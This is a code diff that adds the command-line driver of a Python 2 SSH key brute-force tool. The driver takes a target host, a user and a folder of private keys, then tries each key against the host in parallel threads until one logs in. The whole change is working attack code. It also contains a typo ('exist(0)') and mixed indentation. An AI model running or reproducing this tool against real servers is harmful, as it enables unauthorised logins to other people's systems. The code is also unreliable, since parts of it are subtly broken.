@@ -38,3 +38,37 @@ def connect(user, host, keyfile, release):
 	    connection_lock.release()
 
 
+def main():
+    parser = optparse.OptionParser('usage %prog -H <target host> -u <user> -d <directory>')
+    parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
+    parser.add_option('-d', dest='passDir', type='string', help='specify directory with keys')
+    parser.add_option('-u', dest='user', type='string', help='specify the user')
+
+    (options, args) = parser.parse_args()
+    host = options.tgtHost
+    passDir = options.passDir
+    user = options.user
+
+    if host == None or passDir == None or user == None:
+	print parser.usage
+	exit(0)
+
+    for filename in os.listdir(passDir):
+	if Stop:
+	    print '[*] Existing: Key Found.'
+	    exit(0)
+	if Fails > 5:
+	    print '[!] Exiting: Too many connections closed by remote host.'
+	    print '[!] Adjust number of simultaneous threads.'
+	    exist(0)
+	
+	connection_lock.acquire()
+	fullpath = os.path.join(passDir, filename)
+	print '[-] Testing keyfile ' + str(fullpath)
+	t = Thread(target=connect, args=(user, host, fullpath, True))
+	child = t.start()
+
+
+if __name__ == '__main__':
+    main()
+
